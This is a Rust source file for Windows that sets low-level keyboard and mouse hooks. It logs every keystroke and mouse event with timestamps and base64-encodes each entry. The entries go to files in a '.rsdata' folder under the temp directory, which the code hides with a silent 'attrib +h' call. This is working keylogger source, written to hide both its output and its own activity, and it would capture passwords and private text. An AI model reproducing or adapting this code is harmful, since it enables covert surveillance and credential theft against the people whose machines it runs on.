use std::fs::{OpenOptions, create_dir_all};
use std::io::Write;
use std::sync::Mutex;
use std::path::PathBuf;
use std::env;
use chrono::Local;
use base64::{Engine as _, engine::general_purpose};
use windows::Win32::Foundation::{LPARAM, LRESULT, WPARAM};
use windows::Win32::UI::WindowsAndMessaging::{
    CallNextHookEx, KBDLLHOOKSTRUCT, HHOOK, WM_KEYDOWN,
    MSLLHOOKSTRUCT, WM_MOUSEMOVE, WM_LBUTTONDOWN, WM_RBUTTONDOWN, 
    WM_MBUTTONDOWN, WM_MOUSEWHEEL,
};
use windows::Win32::UI::Input::KeyboardAndMouse::{
    GetAsyncKeyState, GetKeyState, ToAscii,
    VK_RETURN, VK_SPACE, VK_BACK, VK_TAB, VK_SHIFT, VK_CONTROL, VK_MENU,
    VK_CAPITAL, VK_ESCAPE,
};
use std::sync::atomic::{AtomicU64, Ordering};

static LOG_MUTEX: Mutex<()> = Mutex::new(());
static LAST_MOUSE_LOG: AtomicU64 = AtomicU64::new(0);
const MOUSE_MOVE_THROTTLE_MS: u64 = 2000;

pub fn get_log_dir() -> PathBuf {
    let temp = env::temp_dir();
    let log_dir = temp.join(".rsdata");
    let _ = create_dir_all(&log_dir);
    
    #[cfg(windows)]
    {
        use std::process::Command;
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x08000000;
        
        let _ = Command::new("attrib")
            .arg("+h")
            .arg(&log_dir)
            .creation_flags(CREATE_NO_WINDOW)
            .output();
    }
    
    log_dir
}

pub fn get_keylog_path() -> PathBuf {
    get_log_dir().join("kb.dat")
}

pub fn get_mouselog_path() -> PathBuf {
    get_log_dir().join("ms.dat")
}

pub unsafe extern "system" fn keyboard_hook(
    n_code: i32,
    w_param: WPARAM,
    l_param: LPARAM,
) -> LRESULT {
    if n_code >= 0 && w_param.0 as u32 == WM_KEYDOWN {
        let kb_struct = *(l_param.0 as *const KBDLLHOOKSTRUCT);
        let key_code = kb_struct.vkCode;

        let _guard = LOG_MUTEX.lock().unwrap();

        if let Ok(mut log_file) = OpenOptions::new()
            .create(true)
            .append(true)
            .open(get_keylog_path())
        {
            let timestamp = Local::now().format("%Y-%m-%d %H:%M:%S");
            let mut log_entry = format!("[{}] ", timestamp);

            match key_code {
                k if k == VK_RETURN.0 as u32 => log_entry.push_str("[ENTER]\n"),
                k if k == VK_SPACE.0 as u32 => log_entry.push_str("[SPACE]\n"),
                k if k == VK_BACK.0 as u32 => log_entry.push_str("[BACKSPACE]\n"),
                k if k == VK_TAB.0 as u32 => log_entry.push_str("[TAB]\n"),
                k if k == VK_ESCAPE.0 as u32 => log_entry.push_str("[ESC]\n"),
                k if k == VK_SHIFT.0 as u32 => log_entry.push_str("[SHIFT]\n"),
                k if k == VK_CONTROL.0 as u32 => log_entry.push_str("[CTRL]\n"),
                k if k == VK_MENU.0 as u32 => log_entry.push_str("[ALT]\n"),
                k if k == VK_CAPITAL.0 as u32 => log_entry.push_str("[CAPSLOCK]\n"),
                k if (b'A' as u32..=b'Z' as u32).contains(&k) => {
                    let shift_pressed = GetAsyncKeyState(VK_SHIFT.0 as i32) as u16 & 0x8000 != 0;
                    let caps_lock_on = GetKeyState(VK_CAPITAL.0 as i32) & 0x0001 != 0;
                    let make_uppercase = (shift_pressed && !caps_lock_on) 
                        || (!shift_pressed && caps_lock_on);

                    if make_uppercase {
                        log_entry.push(k as u8 as char);
                    } else {
                        log_entry.push((k + 32) as u8 as char);
                    }
                    log_entry.push('\n');
                }
                _ => {
                    let mut keyboard_state = [0u8; 256];

                    if GetAsyncKeyState(VK_SHIFT.0 as i32) as u16 & 0x8000 != 0 {
                        keyboard_state[VK_SHIFT.0 as usize] = 0x80;
                    }

                    let mut result = [0u16; 2];
                    let conversion_result = ToAscii(
                        key_code,
                        kb_struct.scanCode,
                        Some(&keyboard_state),
                        &mut result[0],
                        0,
                    );

                    if conversion_result == 1 {
                        if let Some(ch) = char::from_u32(result[0] as u32) {
                            log_entry.push(ch);
                            log_entry.push('\n');
                        } else {
                            log_entry.push_str(&format!("[KEY_{}]\n", key_code));
                        }
                    } else {
                        log_entry.push_str(&format!("[KEY_{}]\n", key_code));
                    }
                }
            }

            let encoded = general_purpose::STANDARD.encode(log_entry.as_bytes());
            let _ = log_file.write_all(encoded.as_bytes());
            let _ = log_file.write_all(b"\n");
        }
    }

    CallNextHookEx(HHOOK::default(), n_code, w_param, l_param)
}

pub unsafe extern "system" fn mouse_hook(
    n_code: i32,
    w_param: WPARAM,
    l_param: LPARAM,
) -> LRESULT {
    if n_code >= 0 {
        let mouse_struct = *(l_param.0 as *const MSLLHOOKSTRUCT);
        let event_type = w_param.0 as u32;
        let current_time = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_millis() as u64;

        if event_type == WM_MOUSEMOVE {
            let last_log = LAST_MOUSE_LOG.load(Ordering::Relaxed);
            if current_time - last_log < MOUSE_MOVE_THROTTLE_MS {
                return CallNextHookEx(HHOOK::default(), n_code, w_param, l_param);
            }
            LAST_MOUSE_LOG.store(current_time, Ordering::Relaxed);
        }

        let _guard = LOG_MUTEX.lock().unwrap();

        if let Ok(mut log_file) = OpenOptions::new()
            .create(true)
            .append(true)
            .open(get_mouselog_path())
        {
            let timestamp = Local::now().format("%Y-%m-%d %H:%M:%S");

            let log_entry = match event_type {
                WM_MOUSEMOVE => {
                    format!("[{}] Move: ({}, {})\n", timestamp, mouse_struct.pt.x, mouse_struct.pt.y)
                }
                WM_LBUTTONDOWN => {
                    format!("[{}] Left click: ({}, {})\n", timestamp, mouse_struct.pt.x, mouse_struct.pt.y)
                }
                WM_RBUTTONDOWN => {
                    format!("[{}] Right click: ({}, {})\n", timestamp, mouse_struct.pt.x, mouse_struct.pt.y)
                }
                WM_MBUTTONDOWN => {
                    format!("[{}] Middle click: ({}, {})\n", timestamp, mouse_struct.pt.x, mouse_struct.pt.y)
                }
                WM_MOUSEWHEEL => {
                    let delta = (mouse_struct.mouseData >> 16) as i16;
                    let direction = if delta > 0 { "up" } else { "down" };
                    format!("[{}] Scroll {}: ({}, {})\n", timestamp, direction, mouse_struct.pt.x, mouse_struct.pt.y)
                }
                _ => String::new(),
            };

            if !log_entry.is_empty() {
                let encoded = general_purpose::STANDARD.encode(log_entry.as_bytes());
                let _ = log_file.write_all(encoded.as_bytes());
                let _ = log_file.write_all(b"\n");
            }
        }
    }

    CallNextHookEx(HHOOK::default(), n_code, w_param, l_param)
}
